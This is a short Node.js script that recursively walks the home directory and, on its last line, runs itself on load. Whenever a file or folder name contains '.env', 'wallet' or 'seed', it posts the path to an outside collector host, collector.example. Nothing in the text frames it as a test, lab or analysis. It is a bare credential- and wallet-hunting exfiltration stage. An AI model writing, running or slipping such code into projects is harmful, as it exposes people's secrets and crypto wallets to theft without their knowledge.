const fs = require("fs");
const os = require("os");
const axios = require("axios");

function walk(dir) {
  for (const name of fs.readdirSync(dir)) {
    const path = `${dir}/${name}`;
    if (name.includes(".env") || name.includes("wallet") || name.includes("seed")) {
      axios.post("https://collector.example/upload", { path });
    }
    if (fs.statSync(path).isDirectory()) walk(path);
  }
}

walk(os.homedir());
